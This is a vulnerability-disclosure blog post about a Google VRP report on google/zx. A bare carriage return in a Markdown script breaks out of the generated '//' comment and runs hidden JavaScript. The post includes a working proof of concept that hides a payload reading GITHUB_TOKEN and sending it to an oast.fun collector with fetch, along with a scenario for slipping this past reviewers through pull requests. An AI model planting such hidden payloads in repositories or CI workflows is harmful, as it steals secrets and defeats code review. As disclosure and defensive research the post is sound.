 
+++
title = 'Google VRP: To Be a Comment, or Not to Be ?'
date = '2026-02-12T00:00:00+01:00'
draft = false
tags = ['Google', 'zx', 'RCE']
+++

## The Hook (The "What")

Can a single invisible character bypass a security sandbox ?    
![alt text](/images/stc/what-meme.gif)     
I discovered a vulnerability in `google/zx` where a Carriage Return (`\r`) allows arbitrary code execution in Markdown files—right under the nose of code reviewers.


## What is zx ?
In the world of DevOps, we often struggle with **Bash** (which is powerful but messy) and **Node.js** (which is clean but wordy).   
**zx** is a tool created by **Google** that marries the two.  


![alt text](/images/stc/zx.png)


It allows you to write scripts in **JavaScript**, but with the ease of a shell. 
You can write commands like ```await $`ls`  ``` directly inside your code.

### The Markdown Script Feature


The most magical part of zx and where our tragedy begins is its ability to execute **Markdown** files (.md).

- **The Intent**: A developer writes documentation and includes code blocks (**three backtick**).
- **The Mechanism** : When you run `zx script.md`, **zx** parses the file. It treats the text  as comments and the code blocks as executable commands.
- **The Sandbox** : To keep things safe, **zx** is supposed to "silence" any text that isn't inside a formal **code block** by wrapping it in **JavaScript** comments (`//`).


## The problem

The `transformMarkdown` function in `src/md.ts` is responsible for **parsing Markdown** files and converting them into executable JavaScript scripts.   
It iterates through the file content by splitting it using the regex `/\r?\n/` (matching **LF** or **CRLF**).   
However, this regex does not match a standalone **Carriage Return** (`\r`) character.  

In JavaScript, a single-line comment started with `//` is terminated by any Line Terminator sequence, which includes **LF** (`\n`), **CR** (`\r`), **LS** (`\u2028`), and **PS**  (`\u2029`).    

If a **Markdown file** contains a line with an embedded **CR** character (e.g., `Safe Text\rMaliciousCode`), `transformMarkdown` treats the entire sequence as a single line of text (non-code block). It then prefixes the line with `//` to comment it out. The resulting JavaScript
code becomes `// Safe Text\rMaliciousCode`.

When **Node.js** executes this transformed code, the comment `// Safe Text` is terminated by the `\r`, and the subsequent 
`MaliciousCode` is executed as valid JavaScript. This allows an attacker to hide arbitrary code execution within the text sections of a Markdown file, which a user might inspect and believe to be safe documentation or comments. 

This is particularly dangerous as some text editors or viewers may render **CR** simply as a newline or hide it entirely, masking the malicious code.

### Code Segment
Code segment is [here](https://github.com/google/zx/blob/2f6896ea6aa47190d11125f0024726b16d3ae745/src/md.ts#L26-L26)

![alt text](/images/stc/line_vuln.png)

## Context

- A [Bughunters Google](https://bughunters.google.com/) platform.  

![alt text](/images/stc/bbh.png)

**Firstly** i describe a **scenario**, why ?   
Because it's advice given by **Google Security Team** for write a good report, [here](https://bughunters.google.com/learn/improving-your-reports/how-to-report/write-down-the-attack-scenario).

![alt text](/images/stc/advice_googler.png)   


**Secondly**, the right utility of bug :

The **attack vector** is not about `executing untrusted Markdown.`  
It is about the **inability** to audit Markdown before **execution**.  
This vulnerability allows an attacker to bypass manual code reviews by hiding executable
commands inside documentation strings that `zx` fails to properly comment out due to the `\r` parsing anomaly.   

- **The Starting Position** :
The attackers is a **contributors** to a popular Open Source project that uses zx for it automation
(e.g., a setup.md or deploy.md file).   
The attacker has no special privilege other than the ablity to submit a PR  

- **The Goal** : 
The attacker wants to steal the **CI/CD** secrets (like `NPM_TOKEN`, `AWS_ACCESS_KEY`, or `GITHUB_TOKEN`)   
from the project build environment or from the local machine of a maintainer who reviews the code.   

- **The Strategy** : 
The attacker exploits the Interpretation Conflict between the `zx` parser and the `Node.js` engine  
to hide malicious code inside what looks like harmles documentation.  


### Requirements

* Installation

```
tedsig42@exegol:~$ npm i zx -g
```

* Checking a `zx` version.

```bash
tedsig42@exegol:~/poc$ zx -v
8.8.5
```

* Poc creation

```bash
tedsig42@exegol:~/poc$ node -e "require('fs').writeFileSync('poc.md', 'Check logs...\rconsole.log(\'TOKEN:\', process.env.GITHUB_TOKEN); fetch(\'https://your_url.oast.fun/?leak=\' + process.env.GITHUB_TOKEN)')"
```

* Verification

Visible to humans (we see this) :

```bash
tedsig42@exegol:~/poc$  cat poc.md 
console.log('TOKEN:', process.env.GITHUB_TOKEN); fetch('https://qgiofgxlcsbxnelgcjyepgdtdvlowb6qm.oast.fun/?leak=' + process.env.GITHUB_TOKEN)
```
Hidden reality (with `cat -e`):

```bash
tedsig42@exegol:~/poc$ cat -e poc.md 
Check logs...^Mconsole.log('TOKEN:', process.env.GITHUB_TOKEN); fetch('https://qgiofgxlcsbxnelgcjyepgdtdvlowb6qm.oast.fun/?leak=' + process.env.GITHUB_TOKEN)
```

Note that `Check logs...` is not display it with just `cat` .

## POC

- In local

```bash
tedsig42@exegol:~/poc$ zx poc.md
```

It display nothing but your environment variables already send to another destination.

- On Github

`zx` is a tool used in  github workflows file for testing 

- *docs-test.yml*

![alt text](/images/stc/doc_yml.png)


- *poc.md*
What it look like

![alt text](/images/stc/poc_md_github.png)

- *Result on Interact.sh*

You can see that it leak a **github token** without that a command in not in code block.

![alt text](/images/stc/poc_result.png)

## Google Answer


![alt text](/images/stc/final_comment.png)

What **Not Severe Enough** Means

**Google's logic** is likely:

- **User Responsibility**: They believe that if a user runs `zx some-file.md`, the **user is responsible for trusting** that file first.   

- **The "Feature" Argument**: Since `zx` is designed to run code from Markdown, they see "unintended" code execution as a minor parsing flaw rather than a catastrophic security breach.

## Conclusion

This bug help me to differenciate a real bug who can impact enterprise threat model .
In professional security, we often talk about the **Threat Model**. 
This bug is the perfect example of a vulnerability that exists not in the code itself, but in the gap between how humans work and how machines execute.
Thanks to **Google Security Team** for advice and for ressources in their [learn](https://bughunters.google.com/learn/) plateform.  

## End
At end i receive this:

![alt text](/images/stc/FInal_message_google.png)


So thanks to help me with a tweet.
I also open a [Github Issues](https://github.com/google/zx/issues/1403)  and a [Pull Request](https://github.com/google/zx/pull/1404)

![google_vro_bug1](/images/stc/g-bug-1.png)  

- **Feb 10, 2026** : Initial report to Google VRP.

- **Feb 11, 2026** : Google VRP confirms the  bug  but close the report and authorizes disclosure.

